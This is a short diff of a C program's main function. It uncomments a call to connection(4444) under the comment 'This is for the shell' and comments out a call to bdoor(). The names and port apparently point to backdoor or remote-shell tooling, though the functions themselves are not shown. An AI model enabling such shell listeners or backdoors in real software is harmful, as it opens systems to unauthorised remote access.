@@ -20,10 +20,7 @@ int main(int argc, char * argv[]) {
     val_time();
 
     //This is for the shell
-    //connection(4444);
+    connection(4444);
 
-    bdoor();
-
-
+    //bdoor();
 }
-
